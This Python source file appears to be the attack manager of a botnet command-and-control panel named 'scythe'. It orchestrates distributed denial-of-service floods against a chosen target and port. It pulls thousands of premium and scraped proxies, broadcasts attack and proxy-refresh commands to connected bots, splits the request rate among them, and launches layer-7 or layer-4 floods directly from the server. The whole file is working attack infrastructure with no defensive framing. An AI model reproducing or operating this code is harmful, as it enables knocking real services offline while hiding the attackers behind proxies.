import asyncio
import time
import uuid
from typing import Dict, Optional, List, Callable, Awaitable
from datetime import datetime

from app.core.config import settings
from app.core.logger import logger, log_attack_event
from app.core.redis_client import get_redis, RedisKeys
from app.core.models import AttackStatus, AttackRequest, AttackResult

from app.managers.concurrent_manager import concurrent_manager
from app.managers.history_manager import history_manager
from app.managers.proxy_manager import proxy_manager
from app.managers.premium_proxy_manager import premium_proxy_manager, IPRoyalConfig

from app.engine.layer7 import run_layer7_attack
from app.engine.layer4 import run_layer4_attack


class AttackManager:
    def __init__(self):
        self.active_attacks: Dict[str, AttackStatus] = {}
        self.attack_tasks: Dict[str, asyncio.Task] = {}
        self._stop_event = asyncio.Event()
        self._lock = asyncio.Lock()
        self._botnet_manager = None  # Lazy loaded
        self._auto_stop_tasks: Dict[str, asyncio.Task] = {}
        self._stats_reporters: Dict[str, asyncio.Task] = {}

    @property
    def botnet_manager(self):
        if self._botnet_manager is None:
            from app.managers.botnet_manager import botnet_manager
            self._botnet_manager = botnet_manager
        return self._botnet_manager

    async def start_attack(self, req: AttackRequest) -> str:
        async with self._lock:
            current_active = len(self.active_attacks)
            max_conc = await concurrent_manager.get_max()
            if current_active >= max_conc:
                raise Exception(f"Max concurrent attacks reached ({max_conc})")

            attack_id = str(uuid.uuid4())
            start_ts = int(time.time())

            attack = AttackStatus(
                id=attack_id,
                method=req.method,
                target=req.target,
                port=req.port,
                start_time=start_ts,
                duration=req.duration,
                hold_time=req.hold_time or 0,
                rps=0,
                total_requests=0,
                proxy_count_current=0
            )

            self.active_attacks[attack_id] = attack

        await self._save_attack_to_redis(attack)

        rps_limit = await self._get_rps_limit()

        # FIX v9.0: Get proxies with premium mix
        # 60% premium (IPRoyal) + 40% bulk (scraped)
        bot_proxies = await proxy_manager.get_mixed_proxies(count=5000)
        if not bot_proxies:
            logger.warning("[ATTACK-v9.0] No proxies in pool! Running emergency refresh...")
            await proxy_manager.emergency_refresh()
            bot_proxies = await proxy_manager.get_mixed_proxies(count=5000)

        proxy_count = len(bot_proxies)
        logger.info(f"[ATTACK-v9.0] Fetched {proxy_count} mixed proxies (premium + bulk)")

        bot_ids = await self.botnet_manager.get_active_bot_ids()
        bot_count = len(bot_ids)

        if bot_count == 0:
            logger.warning(f"⚠️ No bots connected. Attack will run on server only.")
            rps_per_bot = rps_limit
        else:
            if rps_limit > 0:
                rps_per_bot = max(1, rps_limit // bot_count)
            else:
                rps_per_bot = 0
            logger.info(f"📊 Distribution: {rps_limit} RPS / {bot_count} bots = {rps_per_bot} RPS/bot | {proxy_count} proxies")

        # Distribute proxies to bots
        if bot_count > 0 and bot_proxies:
            attack_data = {
                "attack_id": attack_id,
                "method": req.method,
                "target": req.target,
                "port": req.port,
                "duration": req.duration,
                "hold_time": req.hold_time or 0,
                "rps_limit": rps_per_bot,
                "extra": "",
            }

            result = await self.botnet_manager.broadcast_attack_with_proxies(attack_data, bot_proxies)
            logger.info(f"📡 Botnet broadcast result: {result}")

            # Store reserved proxies for C2 direct fallback
            direct_proxies_reserved = bot_proxies[-min(500, len(bot_proxies)//5):] if len(bot_proxies) > 100 else []
            if direct_proxies_reserved:
                await self._save_direct_proxies(attack_id, direct_proxies_reserved)
        elif bot_count > 0:
            # No proxies but bots connected - send without proxies
            logger.warning(f"📡 Sending attack to {bot_count} bots WITHOUT proxies!")
            for bot_id in bot_ids:
                asyncio.create_task(
                    self.botnet_manager.send_to_bot(bot_id, {
                        "type": "command",
                        "cmd": "attack",
                        "attack_id": attack_id,
                        "method": req.method,
                        "target": req.target,
                        "port": req.port,
                        "duration": req.duration,
                        "hold_time": req.hold_time or 0,
                        "rps_limit": rps_per_bot,
                        "proxies": [],
                    })
                )

        # C2 direct attack - runs alongside botnet
        if bot_count == 0:
            # No bots - C2 runs full direct attack
            task = asyncio.create_task(self._run_direct_attack(attack_id, rps_limit, bot_proxies))
        else:
            # Bots active - C2 runs minimal direct attack with reserved proxies
            direct_proxies = await self._get_direct_proxies(attack_id)
            if direct_proxies:
                logger.info(f"[ATTACK-v9.0] C2 running minimal direct attack with {len(direct_proxies)} reserved proxies")
                task = asyncio.create_task(self._run_direct_attack(attack_id, rps_limit // 10, direct_proxies))
            else:
                logger.info(f"[ATTACK-v9.0] Bots active, C2 direct attack skipped (coordinator mode)")
                task = asyncio.create_task(self._coordinator_mode(attack_id, req.duration + (req.hold_time or 0)))

        self.attack_tasks[attack_id] = task

        total_duration = req.duration + (req.hold_time or 0)

        # Auto-stop task
        auto_task = asyncio.create_task(self._auto_finalize(attack_id, total_duration))
        self._auto_stop_tasks[attack_id] = auto_task

        # Stats reporter
        stats_task = asyncio.create_task(self._stats_reporter(attack_id))
        self._stats_reporters[attack_id] = stats_task

        # Mid-attack proxy refresh for long attacks
        if req.duration > 300:
            asyncio.create_task(self._mid_attack_proxy_refresh(attack_id, req.duration))

        # Broadcast attack started
        await self._broadcast_attack_event("attack_started", attack_id, {
            "method": req.method,
            "target": req.target,
            "port": req.port,
            "duration": req.duration,
            "hold_time": req.hold_time,
            "concurrent": len(self.active_attacks),
            "rps_limit": rps_limit,
            "bots": bot_count,
            "rps_per_bot": rps_per_bot if bot_count > 0 else rps_limit,
            "proxies": proxy_count,
        })

        log_attack_event(attack_id, "started", {
            "method": req.method,
            "target": req.target,
            "port": req.port,
            "duration": req.duration,
            "hold_time": req.hold_time,
            "concurrent": len(self.active_attacks),
            "rps_limit": rps_limit,
            "bots": bot_count,
            "rps_per_bot": rps_per_bot if bot_count > 0 else rps_limit,
            "proxies": proxy_count,
        })

        return attack_id

    async def _stats_reporter(self, attack_id: str):
        """Report stats every 5 seconds"""
        while attack_id in self.active_attacks:
            await asyncio.sleep(5)
            if attack_id not in self.active_attacks:
                break

            attack = self.active_attacks[attack_id]
            bot_ids = await self.botnet_manager.get_active_bot_ids()
            proxy_stats = await proxy_manager.get_stats()

            logger.info(f"[STATS] {attack_id} | RPS: {attack.rps} | Total: {attack.total_requests} | Proxies: {attack.proxy_count_current} | Bots: {len(bot_ids)} | Pool: {proxy_stats.alive}")

    async def _save_direct_proxies(self, attack_id: str, proxies: List[str]):
        redis = await get_redis()
        key = f"scythe:direct_proxies:{attack_id}"
        await redis.set(key, str(proxies), ex=3600)

    async def _get_direct_proxies(self, attack_id: str) -> List[str]:
        redis = await get_redis()
        key = f"scythe:direct_proxies:{attack_id}"
        data = await redis.get(key)
        if data:
            try:
                import ast
                return ast.literal_eval(data)
            except:
                return []
        return []

    async def _coordinator_mode(self, attack_id: str, duration: int):
        """C2 coordinator mode - monitors, no direct attack"""
        logger.info(f"[COORDINATOR] Attack {attack_id} in coordinator mode for {duration}s")
        await asyncio.sleep(duration + 5)
        if attack_id in self.active_attacks:
            await self._finalize_attack(attack_id)

    async def _broadcast_attack_event(self, event_type: str, attack_id: str, data: dict):
        try:
            from app.main import broadcast_ws_message
            await broadcast_ws_message("attack_update", {
                "event": event_type,
                "attack_id": attack_id,
                "data": data,
                "timestamp": time.time(),
            })
        except Exception as e:
            logger.debug(f"Failed to broadcast attack event: {e}")

    async def _auto_finalize(self, attack_id: str, total_duration: int):
        logger.info(f"[AUTO] Attack {attack_id} will auto-finalize in {total_duration}s")
        await asyncio.sleep(total_duration + 5)

        if attack_id in self.active_attacks:
            logger.info(f"[AUTO] Auto-finalizing attack {attack_id} after {total_duration}s")
            await self._broadcast_stop_to_bots(attack_id)
            await self._finalize_attack(attack_id)
        else:
            logger.debug(f"[AUTO] Attack {attack_id} already finalized, skipping")

    async def _broadcast_stop_to_bots(self, attack_id: str):
        try:
            bot_ids = await self.botnet_manager.get_active_bot_ids()
            if bot_ids:
                logger.info(f"[STOP] Broadcasting stop for {attack_id} to {len(bot_ids)} bots")
                await self.botnet_manager.broadcast_command({
                    "type": "command",
                    "cmd": "stop",
                    "attack_id": attack_id
                })
            else:
                logger.debug(f"[STOP] No bots to broadcast stop for {attack_id}")
        except Exception as e:
            logger.error(f"[STOP] Error broadcasting stop to bots: {e}")

    async def _mid_attack_proxy_refresh(self, attack_id: str, duration: int):
        refresh_interval = 180
        max_refreshes = max(0, (duration // refresh_interval) - 1)

        logger.info(f"[REFRESH] Mid-attack refresh for {attack_id}: {max_refreshes} refreshes")

        for i in range(max_refreshes):
            await asyncio.sleep(refresh_interval)

            if attack_id not in self.active_attacks:
                logger.info(f"[REFRESH] Attack {attack_id} ended. Stopping refresh.")
                break

            try:
                # Refresh both premium and bulk proxies
                fresh_proxies = await proxy_manager.get_mixed_proxies(count=3000)
                if not fresh_proxies:
                    logger.warning(f"[REFRESH] No fresh proxies for {attack_id}")
                    continue

                result = await self.botnet_manager.broadcast_proxy_refresh(attack_id, fresh_proxies)
                logger.info(f"[REFRESH] Attack {attack_id} refreshed #{i+1}: {result}")

            except Exception as e:
                logger.error(f"[REFRESH] Error refreshing {attack_id}: {e}")

        logger.info(f"[REFRESH] Completed for {attack_id}")

    async def stop_attack(self, attack_id: str) -> bool:
        async with self._lock:
            if attack_id not in self.active_attacks:
                return False

            if attack_id in self.attack_tasks:
                self.attack_tasks[attack_id].cancel()
                try:
                    await self.attack_tasks[attack_id]
                except asyncio.CancelledError:
                    pass
                del self.attack_tasks[attack_id]

            if attack_id in self._auto_stop_tasks:
                self._auto_stop_tasks[attack_id].cancel()
                try:
                    await self._auto_stop_tasks[attack_id]
                except asyncio.CancelledError:
                    pass
                del self._auto_stop_tasks[attack_id]

            if attack_id in self._stats_reporters:
                self._stats_reporters[attack_id].cancel()
                try:
                    await self._stats_reporters[attack_id]
                except asyncio.CancelledError:
                    pass
                del self._stats_reporters[attack_id]

            attack = self.active_attacks.pop(attack_id, None)

        await self._remove_attack_from_redis(attack_id)
        await self._broadcast_stop_to_bots(attack_id)
        await self._broadcast_attack_event("attack_stopped", attack_id, {
            "total_requests": attack.total_requests if attack else 0,
            "avg_rps": (attack.total_requests // max(1, attack.duration)) if attack else 0,
        })

        if attack:
            avg_rps = attack.total_requests // max(1, attack.duration)
            await history_manager.add_entry(
                domain=attack.target,
                method=attack.method,
                avg_rps=avg_rps,
                total_requests=attack.total_requests,
                duration=attack.duration
            )
            log_attack_event(attack_id, "stopped", {
                "total_requests": attack.total_requests,
                "avg_rps": avg_rps
            })

        return True

    async def stop_all_attacks(self) -> int:
        attack_ids = list(self.active_attacks.keys())
        count = 0
        for aid in attack_ids:
            if await self.stop_attack(aid):
                count += 1
        try:
            bot_ids = await self.botnet_manager.get_active_bot_ids()
            if bot_ids:
                logger.info(f"[STOPALL] Broadcasting stop-all to {len(bot_ids)} bots")
                await self.botnet_manager.broadcast_command({
                    "type": "command",
                    "cmd": "stop"
                })
        except Exception as e:
            logger.error(f"[STOPALL] Error broadcasting stop-all: {e}")
        return count

    def get_active_attacks(self) -> List[AttackStatus]:
        return list(self.active_attacks.values())

    def get_attack(self, attack_id: str) -> Optional[AttackStatus]:
        return self.active_attacks.get(attack_id)

    async def get_total_rps(self) -> int:
        return sum(a.rps for a in self.active_attacks.values())

    async def get_total_requests(self) -> int:
        return sum(a.total_requests for a in self.active_attacks.values())

    async def restore_from_redis(self):
        r = await get_redis()
        attack_ids = await r.smembers(RedisKeys.active_attacks())
        if not attack_ids:
            logger.info("No active attacks to restore from Redis.")
            return

        restored = 0
        for aid in attack_ids:
            data = await r.hgetall(RedisKeys.attack(aid))
            if not data:
                continue
            try:
                for field in ["port", "start_time", "duration", "hold_time", "rps", "total_requests", "proxy_count_current"]:
                    if field in data:
                        data[field] = int(data[field])
                attack = AttackStatus(**data)
                self.active_attacks[aid] = attack
                bot_ids = await self.botnet_manager.get_active_bot_ids()
                if len(bot_ids) == 0:
                    task = asyncio.create_task(self._run_direct_attack(aid, 0, []))
                    self.attack_tasks[aid] = task
                total_duration = attack.duration + (attack.hold_time or 0)
                elapsed = attack.elapsed
                remaining = max(0, total_duration - elapsed)
                auto_task = asyncio.create_task(self._auto_finalize(aid, remaining))
                self._auto_stop_tasks[aid] = auto_task
                restored += 1
                log_attack_event(aid, "restored", {
                    "method": attack.method,
                    "target": attack.target,
                    "elapsed": attack.elapsed
                })
            except Exception as e:
                logger.error(f"Failed to restore attack {aid}: {e}")
                await self._remove_attack_from_redis(aid)

        logger.info(f"Restored {restored} active attacks from Redis.")

    async def update_attack_rps(self, attack_id: str, new_rps: int) -> bool:
        if attack_id not in self.active_attacks:
            logger.warning(f"Attack {attack_id} not found, cannot update RPS")
            return False

        bot_ids = await self.botnet_manager.get_active_bot_ids()
        bot_count = len(bot_ids)

        if bot_count == 0:
            logger.warning(f"No bots connected, cannot redistribute RPS for {attack_id}")
            return False

        rps_per_bot = max(1, new_rps // bot_count)
        logger.info(f"🔄 Redistributing RPS for {attack_id}: {new_rps} total / {bot_count} bots = {rps_per_bot} per bot")

        for bot_id in bot_ids:
            asyncio.create_task(
                self.botnet_manager.send_to_bot(bot_id, {
                    "type": "command",
                    "cmd": "update_rps",
                    "attack_id": attack_id,
                    "rps_limit": rps_per_bot,
                })
            )

        log_attack_event(attack_id, "rps_updated", {
            "new_rps": new_rps,
            "bots": bot_count,
            "rps_per_bot": rps_per_bot
        })

        return True

    async def _get_rps_limit(self) -> int:
        redis = await get_redis()
        value = await redis.get("scythe:config:attack_rps_limit")
        if value is None:
            return getattr(settings, "ATTACK_RPS_LIMIT", 0)
        return int(value)

    async def _run_direct_attack(self, attack_id: str, rps_limit: int = 0, proxies: List[str] = None):
        attack = self.active_attacks.get(attack_id)
        if not attack:
            return

        if attack.method.lower() in ["spectre", "vortex", "titan", "phantom", "serpent", "storm", "nova", "havoc"]:
            engine_func = run_layer7_attack
        else:
            engine_func = run_layer4_attack

        total_duration = attack.duration + (attack.hold_time or 0)

        try:
            if not proxies:
                proxies = await proxy_manager.get_mixed_proxies(count=500)
            proxy_count = len(proxies)
            await self._update_attack_stats(attack_id, 0, 0, proxy_count)

            await engine_func(
                attack_id=attack_id,
                target=attack.target,
                port=attack.port,
                method=attack.method,
                duration=attack.duration,
                hold_time=attack.hold_time or 0,
                proxies=proxies,
                on_update=self._update_attack_stats,
                rps_limit=rps_limit,
            )
        except asyncio.CancelledError:
            logger.info(f"Direct attack {attack_id} cancelled")
        except Exception as e:
            logger.error(f"Direct attack {attack_id} error: {e}")
        finally:
            if attack_id in self.active_attacks:
                await self._finalize_attack(attack_id)

    async def _update_attack_stats(self, attack_id: str, rps: int, total_requests: int, proxy_count: int):
        attack = self.active_attacks.get(attack_id)
        if not attack:
            return

        attack.rps = rps
        attack.total_requests = total_requests
        attack.proxy_count_current = proxy_count

        await self._save_attack_to_redis(attack)
        await self._broadcast_attack_event("attack_progress", attack_id, {
            "rps": rps,
            "total_requests": total_requests,
            "proxy_count": proxy_count,
        })

    async def _finalize_attack(self, attack_id: str):
        async with self._lock:
            if attack_id not in self.active_attacks:
                return

            attack = self.active_attacks.pop(attack_id, None)
            if attack_id in self.attack_tasks:
                del self.attack_tasks[attack_id]
            if attack_id in self._auto_stop_tasks:
                del self._auto_stop_tasks[attack_id]
            if attack_id in self._stats_reporters:
                del self._stats_reporters[attack_id]

            await self._remove_attack_from_redis(attack_id)

        if attack:
            avg_rps = attack.total_requests // max(1, attack.duration)
            await history_manager.add_entry(
                domain=attack.target,
                method=attack.method,
                avg_rps=avg_rps,
                total_requests=attack.total_requests,
                duration=attack.duration
            )
            log_attack_event(attack_id, "completed", {
                "total_requests": attack.total_requests,
                "avg_rps": avg_rps,
                "duration": attack.duration
            })
            await self._broadcast_attack_event("attack_completed", attack_id, {
                "total_requests": attack.total_requests,
                "avg_rps": avg_rps,
                "duration": attack.duration,
            })

    async def _save_attack_to_redis(self, attack: AttackStatus):
        r = await get_redis()
        key = RedisKeys.attack(attack.id)
        await r.hset(key, mapping=attack.model_dump())
        await r.sadd(RedisKeys.active_attacks(), attack.id)

    async def _remove_attack_from_redis(self, attack_id: str):
        r = await get_redis()
        await r.delete(RedisKeys.attack(attack_id))
        await r.srem(RedisKeys.active_attacks(), attack_id)
        await r.delete(f"scythe:direct_proxies:{attack_id}")


# ========== SINGLETON INSTANCE ==========
attack_manager = AttackManager()